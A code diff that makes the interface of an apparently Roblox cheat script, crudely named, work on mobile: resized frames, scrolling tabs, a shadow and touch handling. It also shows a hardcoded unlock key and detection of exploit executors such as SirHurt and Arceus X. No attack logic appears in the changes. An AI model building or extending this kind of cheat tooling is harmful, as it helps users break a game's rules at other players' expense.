@@ -30,6 +30,7 @@ local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "BossFucker"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.IgnoreGuiInset = true
 ScreenGui.Parent = PlayerGui
 
 local guiAlive = true
@@ -37,6 +38,9 @@ local guiAlive = true
 local CORRECT_KEY = "god demon its ez using this script"
 local keyValidated = false
 local GAME_ICON = "rbxassetid://81424212403741"
+
+-- Detect if on mobile
+local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
 
 local C = {
     bg = Color3.fromRGB(15, 15, 20),
@@ -123,8 +127,8 @@ end
 -- ============================
 local NotificationContainer = Instance.new("Frame")
 NotificationContainer.Name = "NotificationContainer"
-NotificationContainer.Size = UDim2.new(0, 320, 1, -20)
-NotificationContainer.Position = UDim2.new(1, -330, 0, 10)
+NotificationContainer.Size = UDim2.new(0, isMobile and 280 or 320, 1, -20)
+NotificationContainer.Position = UDim2.new(1, isMobile and -290 or -330, 0, 10)
 NotificationContainer.BackgroundTransparency = 1
 NotificationContainer.ZIndex = 200
 NotificationContainer.Parent = ScreenGui
@@ -140,18 +144,18 @@ notifList.Parent = NotificationContainer
 local function createNotification(title, message, duration, color)
     if not guiAlive then return end
     local notif = Instance.new("Frame")
-    notif.Size = UDim2.new(1, 0, 0, 70)
+    notif.Size = UDim2.new(1, 0, 0, isMobile and 80 or 70)
     notif.BackgroundColor3 = C.card
     notif.BorderSizePixel = 0
     notif.ZIndex = 201
     notif.Position = UDim2.new(1, 50, 0, 0)
     notif.Parent = NotificationContainer
-    corner(notif, 8)
-    stroke(notif, color or C.accent, 1, 0.3)
+    corner(notif, 10)
+    stroke(notif, color or C.accent, isMobile and 2 or 1, 0.3)
 
     local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0, 3, 0.7, 0)
-    bar.Position = UDim2.new(0, 8, 0.15, 0)
+    bar.Size = UDim2.new(0, 4, 0.65, 0)
+    bar.Position = UDim2.new(0, 10, 0.175, 0)
     bar.BackgroundColor3 = color or C.accent
     bar.BorderSizePixel = 0
     bar.ZIndex = 202
@@ -159,24 +163,24 @@ local function createNotification(title, message, duration, color)
     corner(bar, 2)
 
     local titleLabel = Instance.new("TextLabel")
-    titleLabel.Size = UDim2.new(1, -40, 0, 20)
-    titleLabel.Position = UDim2.new(0, 18, 0, 8)
+    titleLabel.Size = UDim2.new(1, -45, 0, 22)
+    titleLabel.Position = UDim2.new(0, 20, 0, 10)
     titleLabel.BackgroundTransparency = 1
     titleLabel.Text = title
     titleLabel.TextColor3 = C.white
-    titleLabel.TextSize = 12
+    titleLabel.TextSize = isMobile and 13 or 12
     titleLabel.Font = Enum.Font.GothamBold
     titleLabel.TextXAlignment = Enum.TextXAlignment.Left
     titleLabel.ZIndex = 202
     titleLabel.Parent = notif
 
     local msgLabel = Instance.new("TextLabel")
-    msgLabel.Size = UDim2.new(1, -40, 0, 32)
-    msgLabel.Position = UDim2.new(0, 18, 0, 30)
+    msgLabel.Size = UDim2.new(1, -45, 0, isMobile and 38 or 32)
+    msgLabel.Position = UDim2.new(0, 20, 0, isMobile and 32 or 30)
     msgLabel.BackgroundTransparency = 1
     msgLabel.Text = message
     msgLabel.TextColor3 = C.textDim
-    msgLabel.TextSize = 11
+    msgLabel.TextSize = isMobile and 11 or 10
     msgLabel.Font = Enum.Font.Gotham
     msgLabel.TextXAlignment = Enum.TextXAlignment.Left
     msgLabel.TextYAlignment = Enum.TextYAlignment.Top
@@ -184,12 +188,12 @@ local function createNotification(title, message, duration, color)
     msgLabel.ZIndex = 202
     msgLabel.Parent = notif
 
-    tw(notif, 0.4, {Position = UDim2.new(0, 0, 0, 0)}, Enum.EasingStyle.Back)
+    tw(notif, 0.5, {Position = UDim2.new(0, 0, 0, 0)}, Enum.EasingStyle.Back)
 
     task.delay(duration or 4, function()
         if not guiAlive then pcall(function() notif:Destroy() end) return end
-        tw(notif, 0.3, {Position = UDim2.new(1, 50, 0, 0)}, Enum.EasingStyle.Back, Enum.EasingDirection.In)
-        task.wait(0.4)
+        tw(notif, 0.4, {Position = UDim2.new(1, 50, 0, 0)}, Enum.EasingStyle.Back, Enum.EasingDirection.In)
+        task.wait(0.5)
         pcall(function() notif:Destroy() end)
     end)
 end
@@ -209,7 +213,7 @@ local function getExecutor()
     elseif is_sirhurt_closure then return "SirHurt"
     elseif Arceus then return "Arceus X"
     elseif IsElectron then return "Electron"
-    else return "Unknown Executor"
+    else return isMobile and "Mobile Executor" or "Unknown Executor"
     end
 end
 
@@ -692,11 +696,11 @@ local function disableNameHider()
 end
 
 -- ============================
--- MAIN FRAME
+-- MAIN FRAME (MOBILE OPTIMIZED)
 -- ============================
-local SIDEBAR_W = 140
-local MAIN_W = 520
-local MAIN_H = 340
+local SIDEBAR_W = isMobile and 100 or 140
+local MAIN_W = isMobile and math.min(ScreenGui.AbsoluteSize.X - 20, 450) or 520
+local MAIN_H = isMobile and math.min(ScreenGui.AbsoluteSize.Y - 60, 400) or 340
 
 local Main = Instance.new("Frame")
 Main.Name = "Main"
@@ -709,8 +713,23 @@ Main.BackgroundTransparency = 0.05
 Main.ClipsDescendants = true
 Main.ZIndex = 5
 Main.Parent = ScreenGui
-corner(Main, 10)
-stroke(Main, C.divider, 1, 0.6)
+corner(Main, isMobile and 12 or 10)
+stroke(Main, C.divider, isMobile and 2 or 1, 0.6)
+
+-- Shadow effect for depth
+local Shadow = Instance.new("ImageLabel")
+Shadow.Name = "Shadow"
+Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+Shadow.BackgroundTransparency = 1
+Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+Shadow.Size = UDim2.new(1, 30, 1, 30)
+Shadow.ZIndex = 4
+Shadow.Image = "rbxassetid://1316045217"
+Shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.ImageTransparency = 0.7
+Shadow.ScaleType = Enum.ScaleType.Slice
+Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+Shadow.Parent = Main
 
 -- ============================
 -- INTRO OVERLAY
@@ -723,7 +742,7 @@ IntroOverlay.BackgroundTransparency = 0
 IntroOverlay.BorderSizePixel = 0
 IntroOverlay.ZIndex = 100
 IntroOverlay.Parent = Main
-corner(IntroOverlay, 10)
+corner(IntroOverlay, isMobile and 12 or 10)
 
 local IntroBlurOverlay = Instance.new("Frame")
 IntroBlurOverlay.Size = UDim2.new(1, 0, 1, 0)
@@ -733,18 +752,18 @@ IntroBlurOverlay.BackgroundTransparency = 0.15
 IntroBlurOverlay.BorderSizePixel = 0
 IntroBlurOverlay.ZIndex = 99
 IntroBlurOverlay.Parent = Main
-corner(IntroBlurOverlay, 10)
+corner(IntroBlurOverlay, isMobile and 12 or 10)
 
 local IntroCenter = Instance.new("Frame")
-IntroCenter.Size = UDim2.new(0, 300, 0, 220)
-IntroCenter.Position = UDim2.new(0.5, -150, 0.5, -110)
+IntroCenter.Size = UDim2.new(0, isMobile and 260 or 300, 0, isMobile and 200 or 220)
+IntroCenter.Position = UDim2.new(0.5, isMobile and -130 or -150, 0.5, isMobile and -100 or -110)
 IntroCenter.BackgroundTransparency = 1
 IntroCenter.ZIndex = 101
 IntroCenter.Parent = IntroOverlay
 
 local IntroLogo = Instance.new("ImageLabel")
-IntroLogo.Size = UDim2.new(0, 64, 0, 64)
-IntroLogo.Position = UDim2.new(0.5, -32, 0, 0)
+IntroLogo.Size = UDim2.new(0, isMobile and 70 or 64, 0, isMobile and 70 or 64)
+IntroLogo.Position = UDim2.new(0.5, isMobile and -35 or -32, 0, 0)
 IntroLogo.BackgroundColor3 = C.card
 IntroLogo.BackgroundTransparency = 1
 IntroLogo.Image = GAME_ICON
@@ -752,35 +771,35 @@ IntroLogo.ImageTransparency = 1
 IntroLogo.ZIndex = 102
 IntroLogo.ScaleType = Enum.ScaleType.Crop
 IntroLogo.Parent = IntroCenter
-corner(IntroLogo, 14)
+corner(IntroLogo, isMobile and 16 or 14)
 
 local IntroTitle = Instance.new("TextLabel")
-IntroTitle.Size = UDim2.new(1, 0, 0, 30)
-IntroTitle.Position = UDim2.new(0, 0, 0, 78)
+IntroTitle.Size = UDim2.new(1, 0, 0, isMobile and 34 or 30)
+IntroTitle.Position = UDim2.new(0, 0, 0, isMobile and 82 or 78)
 IntroTitle.BackgroundTransparency = 1
 IntroTitle.Text = "Boss Fucker"
 IntroTitle.TextColor3 = C.white
-IntroTitle.TextSize = 22
+IntroTitle.TextSize = isMobile and 24 or 22
 IntroTitle.Font = Enum.Font.GothamBold
 IntroTitle.TextTransparency = 1
 IntroTitle.ZIndex = 102
 IntroTitle.Parent = IntroCenter
 
 local IntroWelcome = Instance.new("TextLabel")
-IntroWelcome.Size = UDim2.new(1, 0, 0, 20)
-IntroWelcome.Position = UDim2.new(0, 0, 0, 108)
+IntroWelcome.Size = UDim2.new(1, 0, 0, isMobile and 22 or 20)
+IntroWelcome.Position = UDim2.new(0, 0, 0, isMobile and 116 or 108)
 IntroWelcome.BackgroundTransparency = 1
 IntroWelcome.Text = "Welcome, " .. LocalPlayer.Name
 IntroWelcome.TextColor3 = C.textDim
-IntroWelcome.TextSize = 14
+IntroWelcome.TextSize = isMobile and 15 or 14
 IntroWelcome.Font = Enum.Font.Gotham
 IntroWelcome.TextTransparency = 1
 IntroWelcome.ZIndex = 102
 IntroWelcome.Parent = IntroCenter
 
 local ProgressOuter = Instance.new("Frame")
-ProgressOuter.Size = UDim2.new(0.7, 0, 0, 3)
-ProgressOuter.Position = UDim2.new(0.15, 0, 0, 150)
+ProgressOuter.Size = UDim2.new(0.7, 0, 0, isMobile and 4 or 3)
+ProgressOuter.Position = UDim2.new(0.15, 0, 0, isMobile and 158 or 150)
 ProgressOuter.BackgroundColor3 = C.divider
 ProgressOuter.BorderSizePixel = 0
 ProgressOuter.ZIndex = 102
@@ -798,12 +817,12 @@ ProgressInner.Parent = ProgressOuter
 corner(ProgressInner, 2)
 
 local IntroStatus = Instance.new("TextLabel")
-IntroStatus.Size = UDim2.new(1, 0, 0, 16)
-IntroStatus.Position = UDim2.new(0, 0, 0, 165)
+IntroStatus.Size = UDim2.new(1, 0, 0, isMobile and 18 or 16)
+IntroStatus.Position = UDim2.new(0, 0, 0, isMobile and 173 or 165)
 IntroStatus.BackgroundTransparency = 1
 IntroStatus.Text = ""
 IntroStatus.TextColor3 = C.textMuted
-IntroStatus.TextSize = 11
+IntroStatus.TextSize = isMobile and 12 or 11
 IntroStatus.Font = Enum.Font.Gotham
 IntroStatus.TextTransparency = 1
 IntroStatus.ZIndex = 102
@@ -819,7 +838,7 @@ SidebarFrame.BackgroundColor3 = C.sidebar
 SidebarFrame.BorderSizePixel = 0
 SidebarFrame.ZIndex = 6
 SidebarFrame.Parent = Main
-corner(SidebarFrame, 10)
+corner(SidebarFrame, isMobile and 12 or 10)
 
 local SidebarFix = Instance.new("Frame")
 SidebarFix.Size = UDim2.new(0.5, 0, 1, 0)
@@ -830,7 +849,7 @@ SidebarFix.ZIndex = 6
 SidebarFix.Parent = SidebarFrame
 
 local SidebarDivider = Instance.new("Frame")
-SidebarDivider.Size = UDim2.new(0, 1, 1, -20)
+SidebarDivider.Size = UDim2.new(0, isMobile and 2 or 1, 1, -20)
 SidebarDivider.Position = UDim2.new(1, 0, 0, 10)
 SidebarDivider.BackgroundColor3 = C.divider
 SidebarDivider.BackgroundTransparency = 0.5
@@ -839,42 +858,48 @@ SidebarDivider.ZIndex = 7
 SidebarDivider.Parent = SidebarFrame
 
 local SidebarHeader = Instance.new("Frame")
-SidebarHeader.Size = UDim2.new(1, 0, 0, 50)
+SidebarHeader.Size = UDim2.new(1, 0, 0, isMobile and 55 or 50)
 SidebarHeader.BackgroundTransparency = 1
 SidebarHeader.ZIndex = 7
 SidebarHeader.Parent = SidebarFrame
 
 local SidebarLogo = Instance.new("ImageLabel")
-SidebarLogo.Size = UDim2.new(0, 28, 0, 28)
-SidebarLogo.Position = UDim2.new(0, 14, 0.5, -14)
+SidebarLogo.Size = UDim2.new(0, isMobile and 32 or 28, 0, isMobile and 32 or 28)
+SidebarLogo.Position = UDim2.new(0, isMobile and 10 or 14, 0.5, isMobile and -16 or -14)
 SidebarLogo.BackgroundColor3 = C.card
 SidebarLogo.BackgroundTransparency = 0
 SidebarLogo.Image = GAME_ICON
 SidebarLogo.ZIndex = 8
 SidebarLogo.ScaleType = Enum.ScaleType.Crop
 SidebarLogo.Parent = SidebarHeader
-corner(SidebarLogo, 7)
+corner(SidebarLogo, isMobile and 8 or 7)
 
 local SidebarTitle = Instance.new("TextLabel")
-SidebarTitle.Size = UDim2.new(0, 85, 0, 20)
-SidebarTitle.Position = UDim2.new(0, 48, 0.5, -10)
+SidebarTitle.Size = UDim2.new(0, isMobile and 48 or 85, 0, isMobile and 22 or 20)
+SidebarTitle.Position = UDim2.new(0, isMobile and 46 or 48, 0.5, isMobile and -11 or -10)
 SidebarTitle.BackgroundTransparency = 1
-SidebarTitle.Text = "Boss Fucker"
+SidebarTitle.Text = isMobile and "BF" or "Boss Fucker"
 SidebarTitle.TextColor3 = C.text
-SidebarTitle.TextSize = 13
+SidebarTitle.TextSize = isMobile and 14 or 13
 SidebarTitle.Font = Enum.Font.GothamBold
 SidebarTitle.TextXAlignment = Enum.TextXAlignment.Left
 SidebarTitle.ZIndex = 8
 SidebarTitle.Parent = SidebarHeader
 
-local TabContainer = Instance.new("Frame")
-TabContainer.Size = UDim2.new(1, 0, 1, -50)
-TabContainer.Position = UDim2.new(0, 0, 0, 50)
+local TabContainer = Instance.new("ScrollingFrame")
+TabContainer.Size = UDim2.new(1, 0, 1, isMobile and -55 or -50)
+TabContainer.Position = UDim2.new(0, 0, 0, isMobile and 55 or 50)
 TabContainer.BackgroundTransparency = 1
+TabContainer.ScrollBarThickness = isMobile and 4 or 3
+TabContainer.ScrollBarImageColor3 = C.scrollbar
+TabContainer.ScrollBarImageTransparency = 0.3
+TabContainer.BorderSizePixel = 0
+TabContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+TabContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
 TabContainer.ZIndex = 7
 TabContainer.Parent = SidebarFrame
-pad(TabContainer, 4, 8, 8, 8)
-makeList(TabContainer, Enum.FillDirection.Vertical, 2)
+pad(TabContainer, 4, 8, isMobile and 6 or 8, isMobile and 6 or 8)
+makeList(TabContainer, Enum.FillDirection.Vertical, isMobile and 3 or 2)
 
 -- ============================
 -- CONTENT AREA
@@ -889,61 +914,61 @@ ContentArea.ClipsDescendants = true
 ContentArea.Parent = Main
 
 local TopBar = Instance.new("Frame")
-TopBar.Size = UDim2.new(1, 0, 0, 42)
+TopBar.Size = UDim2.new(1, 0, 0, isMobile and 48 or 42)
 TopBar.BackgroundTransparency = 1
 TopBar.BorderSizePixel = 0
 TopBar.ZIndex = 7
 TopBar.Parent = ContentArea
 
 local PageTitle = Instance.new("TextLabel")
-PageTitle.Size = UDim2.new(0.6, 0, 1, 0)
-PageTitle.Position = UDim2.new(0, 16, 0, 0)
+PageTitle.Size = UDim2.new(0.5, 0, 1, 0)
+PageTitle.Position = UDim2.new(0, isMobile and 12 or 16, 0, 0)
 PageTitle.BackgroundTransparency = 1
 PageTitle.Text = "Key"
 PageTitle.TextColor3 = C.text
-PageTitle.TextSize = 16
+PageTitle.TextSize = isMobile and 17 or 16
 PageTitle.Font = Enum.Font.GothamBold
 PageTitle.TextXAlignment = Enum.TextXAlignment.Left
 PageTitle.ZIndex = 8
 PageTitle.Parent = TopBar
 
 local Controls = Instance.new("Frame")
-Controls.Size = UDim2.new(0, 70, 0, 28)
-Controls.Position = UDim2.new(1, -82, 0.5, -14)
+Controls.Size = UDim2.new(0, isMobile and 75 or 70, 0, isMobile and 32 or 28)
+Controls.Position = UDim2.new(1, isMobile and -87 or -82, 0.5, isMobile and -16 or -14)
 Controls.BackgroundTransparency = 1
 Controls.ZIndex = 8
 Controls.Parent = TopBar
-makeList(Controls, Enum.FillDirection.Horizontal, 6)
+makeList(Controls, Enum.FillDirection.Horizontal, isMobile and 7 or 6)
 
 local MinBtn = Instance.new("TextButton")
-MinBtn.Size = UDim2.new(0, 28, 0, 28)
+MinBtn.Size = UDim2.new(0, isMobile and 32 or 28, 0, isMobile and 32 or 28)
 MinBtn.BackgroundColor3 = C.card
 MinBtn.BorderSizePixel = 0
 MinBtn.Text = "-"
 MinBtn.TextColor3 = C.textDim
-MinBtn.TextSize = 16
+MinBtn.TextSize = isMobile and 18 or 16
 MinBtn.Font = Enum.Font.GothamBold
 MinBtn.AutoButtonColor = false
 MinBtn.ZIndex = 9
 MinBtn.Parent = Controls
-corner(MinBtn, 6)
+corner(MinBtn, isMobile and 8 or 6)
 
 local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Size = UDim2.new(0, isMobile and 32 or 28, 0, isMobile and 32 or 28)
 CloseBtn.BackgroundColor3 = C.card
 CloseBtn.BorderSizePixel = 0
-CloseBtn.Text = "x"
+CloseBtn.Text = "×"
 CloseBtn.TextColor3 = C.textDim
-CloseBtn.TextSize = 14
+CloseBtn.TextSize = isMobile and 20 or 18
 CloseBtn.Font = Enum.Font.GothamBold
 CloseBtn.AutoButtonColor = false
 CloseBtn.ZIndex = 9
 CloseBtn.Parent = Controls
-corner(CloseBtn, 6)
+corner(CloseBtn, isMobile and 8 or 6)
 
 local TopDivider = Instance.new("Frame")
-TopDivider.Size = UDim2.new(1, -24, 0, 1)
-TopDivider.Position = UDim2.new(0, 12, 0, 42)
+TopDivider.Size = UDim2.new(1, isMobile and -20 or -24, 0, isMobile and 2 or 1)
+TopDivider.Position = UDim2.new(0, isMobile and 10 or 12, 0, isMobile and 48 or 42)
 TopDivider.BackgroundColor3 = C.divider
 TopDivider.BackgroundTransparency = 0.5
 TopDivider.BorderSizePixel = 0
@@ -951,11 +976,11 @@ TopDivider.ZIndex = 7
 TopDivider.Parent = ContentArea
 
 local ContentScroll = Instance.new("ScrollingFrame")
-ContentScroll.Size = UDim2.new(1, 0, 1, -48)
-ContentScroll.Position = UDim2.new(0, 0, 0, 48)
+ContentScroll.Size = UDim2.new(1, 0, 1, isMobile and -54 or -48)
+ContentScroll.Position = UDim2.new(0, 0, 0, isMobile and 54 or 48)
 ContentScroll.BackgroundTransparency = 1
 ContentScroll.BorderSizePixel = 0
-ContentScroll.ScrollBarThickness = 3
+ContentScroll.ScrollBarThickness = isMobile and 5 or 3
 ContentScroll.ScrollBarImageColor3 = C.scrollbar
 ContentScroll.ScrollBarImageTransparency = 0.3
 ContentScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
@@ -988,8 +1013,8 @@ for i, data in ipairs(tabData) do
     page.Visible = false
     page.ZIndex = 8
     page.Parent = ContentScroll
-    makeList(page, Enum.FillDirection.Vertical, 8, Enum.HorizontalAlignment.Center)
-    pad(page, 10, 10, 14, 14)
+    makeList(page, Enum.FillDirection.Vertical, isMobile and 10 or 8, Enum.HorizontalAlignment.Center)
+    pad(page, isMobile and 12 or 10, isMobile and 12 or 10, isMobile and 12 or 14, isMobile and 12 or 14)
     tabPages[i] = page
 end
 
@@ -1007,10 +1032,14 @@ local function selectTab(index)
             if i == index then
                 tw(btn, 0.25, {BackgroundColor3 = C.accent, BackgroundTransparency = 0.85})
                 if btn:FindFirstChild("Label") then tw(btn.Label, 0.25, {TextColor3 = C.accent}) end
+                if btn:FindFirstChild("Icon") then tw(btn.Icon, 0.25, {TextColor3 = C.accent}) end
             else
                 tw(btn, 0.25, {BackgroundColor3 = C.sidebar, BackgroundTransparency = 1})
                 if btn:FindFirstChild("Label") then
                     tw(btn.Label, 0.25, {TextColor3 = (tabData[i] and tabData[i].locked and not keyValidated) and C.textMuted or C.textDim})
+                end
+                if btn:FindFirstChild("Icon") then
+                    tw(btn.Icon, 0.25, {TextColor3 = C.textDim})
                 end
             end
         end
@@ -1046,7 +1075,7 @@ end
 for i, data in ipairs(tabData) do
     local btn = Instance.new("TextButton")
     btn.Name = "TabBtn_" .. data.name
-    btn.Size = UDim2.new(1, 0, 0, 32)
+    btn.Size = UDim2.new(1, 0, 0, isMobile and 38 or 32)
     btn.BackgroundColor3 = C.sidebar
     btn.BackgroundTransparency = 1
     btn.BorderSizePixel = 0
@@ -1055,26 +1084,27 @@ for i, data in ipairs(tabData) do
     btn.ZIndex = 8
     btn.LayoutOrder = i
     btn.Parent = TabContainer
-    corner(btn, 6)
+    corner(btn, isMobile and 8 or 6)
 
     local icon = Instance.new("TextLabel")
     icon.Name = "Icon"
-    icon.Size = UDim2.new(0, 22, 1, 0)
-    icon.Position = UDim2.new(0, 8, 0, 0)
+    icon.Size = UDim2.new(0, isMobile and 24 or 22, 1, 0)
+    icon.Position = UDim2.new(0, isMobile and 6 or 8, 0, 0)
     icon.BackgroundTransparency = 1
     icon.Text = data.icon
-    icon.TextSize = 13
+    icon.TextSize = isMobile and 15 or 13
+    icon.TextColor3 = C.textDim
     icon.ZIndex = 9
     icon.Parent = btn
 
     local label = Instance.new("TextLabel")
     label.Name = "Label"
-    label.Size = UDim2.new(1, -50, 1, 0)
-    label.Position = UDim2.new(0, 32, 0, 0)
+    label.Size = UDim2.new(1, isMobile and -55 or -50, 1, 0)
+    label.Position = UDim2.new(0, isMobile and 28 or 32, 0, 0)
     label.BackgroundTransparency = 1
-    label.Text = data.name
+    label.Text = isMobile and data.name:sub(1, 4) or data.name
     label.TextColor3 = data.locked and C.textMuted or C.textDim
-    label.TextSize = 12
+    label.TextSize = isMobile and 13 or 12
     label.Font = Enum.Font.GothamSemibold
     label.TextXAlignment = Enum.TextXAlignment.Left
     label.ZIndex = 9
@@ -1083,46 +1113,53 @@ for i, data in ipairs(tabData) do
     if data.locked then
         local lockIcon = Instance.new("TextLabel")
         lockIcon.Name = "LockIcon"
-        lockIcon.Size = UDim2.new(0, 14, 1, 0)
-        lockIcon.Position = UDim2.new(1, -18, 0, 0)
+        lockIcon.Size = UDim2.new(0, isMobile and 16 or 14, 1, 0)
+        lockIcon.Position = UDim2.new(1, isMobile and -20 or -18, 0, 0)
         lockIcon.BackgroundTransparency = 1
         lockIcon.Text = "🔒"
-        lockIcon.TextSize = 9
+        lockIcon.TextSize = isMobile and 10 or 9
         lockIcon.ZIndex = 9
         lockIcon.Parent = btn
     end
 
-    btn.MouseEnter:Connect(function()
-        if not guiAlive then return end
-        local idx = table.find(tabBtns, btn)
-        if idx and currentTab ~= idx and tabData[idx] and (not tabData[idx].locked or keyValidated) then
-            tw(btn, 0.15, {BackgroundTransparency = 0.9, BackgroundColor3 = C.card})
-        end
-    end)
-    btn.MouseLeave:Connect(function()
-        if not guiAlive then return end
-        local idx = table.find(tabBtns, btn)
-        if idx and currentTab ~= idx then
-            tw(btn, 0.15, {BackgroundTransparency = 1, BackgroundColor3 = C.sidebar})
-        end
-    end)
     btn.MouseButton1Click:Connect(function()
         if not guiAlive then return end
         local idx = table.find(tabBtns, btn)
         if idx then
             if tabData[idx] and tabData[idx].locked and not keyValidated then return end
+            tw(btn, 0.1, {BackgroundTransparency = 0.85}, Enum.EasingStyle.Linear)
+            task.wait(0.1)
+            tw(btn, 0.15, {BackgroundTransparency = currentTab == idx and 0.85 or 1})
             selectTab(idx)
         end
     end)
+
+    if not isMobile then
+        btn.MouseEnter:Connect(function()
+            if not guiAlive then return end
+            local idx = table.find(tabBtns, btn)
+            if idx and currentTab ~= idx and tabData[idx] and (not tabData[idx].locked or keyValidated) then
+                tw(btn, 0.15, {BackgroundTransparency = 0.9, BackgroundColor3 = C.card})
+            end
+        end)
+        btn.MouseLeave:Connect(function()
+            if not guiAlive then return end
+            local idx = table.find(tabBtns, btn)
+            if idx and currentTab ~= idx then
+                tw(btn, 0.15, {BackgroundTransparency = 1, BackgroundColor3 = C.sidebar})
+            end
+        end)
+    end
+
     tabBtns[i] = btn
 end
 
 -- ============================
--- UI BUILDERS
+-- UI BUILDERS (MOBILE OPTIMIZED)
 -- ============================
 local function makeSection(parent, title, order)
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 0, 22)
+    frame.Size = UDim2.new(1, 0, 0, isMobile and 26 or 22)
     frame.BackgroundTransparency = 1
     frame.ZIndex = 9
     frame.LayoutOrder = order or 0
@@ -1132,7 +1169,7 @@ local function makeSection(parent, title, order)
     lbl.BackgroundTransparency = 1
     lbl.Text = string.upper(title)
     lbl.TextColor3 = C.textMuted
-    lbl.TextSize = 10
+    lbl.TextSize = isMobile and 11 or 10
     lbl.Font = Enum.Font.GothamBold
     lbl.TextXAlignment = Enum.TextXAlignment.Left
     lbl.ZIndex = 10
@@ -1142,61 +1179,71 @@ end
 
 local function makeToggle(parent, text, default, order, callback)
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 0, 38)
+    frame.Size = UDim2.new(1, 0, 0, isMobile and 46 or 38)
     frame.BackgroundColor3 = C.card
     frame.BorderSizePixel = 0
     frame.ZIndex = 9
     frame.LayoutOrder = order or 0
     frame.Parent = parent
-    corner(frame, 8)
+    corner(frame, isMobile and 10 or 8)
+
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -60, 1, 0)
-    lbl.Position = UDim2.new(0, 14, 0, 0)
+    lbl.Size = UDim2.new(1, isMobile and -70 or -60, 1, 0)
+    lbl.Position = UDim2.new(0, isMobile and 16 or 14, 0, 0)
     lbl.BackgroundTransparency = 1
     lbl.Text = text
     lbl.TextColor3 = C.text
-    lbl.TextSize = 12
+    lbl.TextSize = isMobile and 13 or 12
     lbl.Font = Enum.Font.GothamSemibold
     lbl.TextXAlignment = Enum.TextXAlignment.Left
     lbl.ZIndex = 10
     lbl.Parent = frame
+
     local track = Instance.new("Frame")
-    track.Size = UDim2.new(0, 36, 0, 18)
-    track.Position = UDim2.new(1, -50, 0.5, -9)
+    track.Size = UDim2.new(0, isMobile and 44 or 36, 0, isMobile and 22 or 18)
+    track.Position = UDim2.new(1, isMobile and -56 or -50, 0.5, isMobile and -11 or -9)
     track.BackgroundColor3 = default and C.accent or C.toggleOff
     track.BorderSizePixel = 0
     track.ZIndex = 10
     track.Parent = frame
-    corner(track, 9)
+    corner(track, isMobile and 11 or 9)
+
     local knob = Instance.new("Frame")
-    knob.Size = UDim2.new(0, 14, 0, 14)
-    knob.Position = default and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+    knob.Size = UDim2.new(0, isMobile and 18 or 14, 0, isMobile and 18 or 14)
+    knob.Position = default and UDim2.new(1, isMobile and -20 or -16, 0.5, isMobile and -9 or -7) or UDim2.new(0, 2, 0.5, isMobile and -9 or -7)
     knob.BackgroundColor3 = C.white
     knob.BorderSizePixel = 0
     knob.ZIndex = 11
     knob.Parent = track
-    corner(knob, 7)
+    corner(knob, isMobile and 9 or 7)
+
     local enabled = default or false
+
     local click = Instance.new("TextButton")
     click.Size = UDim2.new(1, 0, 1, 0)
     click.BackgroundTransparency = 1
     click.Text = ""
     click.ZIndex = 12
     click.Parent = frame
+
     click.MouseButton1Click:Connect(function()
         if not guiAlive then return end
         enabled = not enabled
         tw(track, 0.25, {BackgroundColor3 = enabled and C.accent or C.toggleOff})
-        tw(knob, 0.25, {Position = enabled and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)}, Enum.EasingStyle.Back)
+        tw(knob, 0.25, {Position = enabled and UDim2.new(1, isMobile and -20 or -16, 0.5, isMobile and -9 or -7) or UDim2.new(0, 2, 0.5, isMobile and -9 or -7)}, Enum.EasingStyle.Back)
         if callback then callback(enabled) end
     end)
-    click.MouseEnter:Connect(function() if guiAlive then tw(frame, 0.15, {BackgroundColor3 = C.cardHover}) end end)
-    click.MouseLeave:Connect(function() if guiAlive then tw(frame, 0.15, {BackgroundColor3 = C.card}) end end)
+
+    if not isMobile then
+        click.MouseEnter:Connect(function() if guiAlive then tw(frame, 0.15, {BackgroundColor3 = C.cardHover}) end end)
+        click.MouseLeave:Connect(function() if guiAlive then tw(frame, 0.15, {BackgroundColor3 = C.card}) end end)
+    end
+
     return frame
 end
 
 local function makeButton(parent, text, desc, order, callback)
-    local h = desc and 50 or 38
+    local h = desc and (isMobile and 58 or 50) or (isMobile and 46 or 38)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, h)
     btn.BackgroundColor3 = C.card
@@ -1206,64 +1253,74 @@ local function makeButton(parent, text, desc, order, callback)
     btn.ZIndex = 9
     btn.LayoutOrder = order or 0
     btn.Parent = parent
-    corner(btn, 8)
+    corner(btn, isMobile and 10 or 8)
+
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -40, 0, 18)
-    lbl.Position = UDim2.new(0, 14, 0, desc and 8 or 10)
+    lbl.Size = UDim2.new(1, -45, 0, isMobile and 20 or 18)
+    lbl.Position = UDim2.new(0, isMobile and 16 or 14, 0, desc and (isMobile and 10 or 8) or (isMobile and 13 or 10))
     lbl.BackgroundTransparency = 1
     lbl.Text = text
     lbl.TextColor3 = C.text
-    lbl.TextSize = 12
+    lbl.TextSize = isMobile and 13 or 12
     lbl.Font = Enum.Font.GothamSemibold
     lbl.TextXAlignment = Enum.TextXAlignment.Left
     lbl.ZIndex = 10
     lbl.Parent = btn
+
     if desc then
         local d = Instance.new("TextLabel")
-        d.Size = UDim2.new(1, -40, 0, 14)
-        d.Position = UDim2.new(0, 14, 0, 28)
+        d.Size = UDim2.new(1, -45, 0, isMobile and 16 or 14)
+        d.Position = UDim2.new(0, isMobile and 16 or 14, 0, isMobile and 32 or 28)
         d.BackgroundTransparency = 1
         d.Text = desc
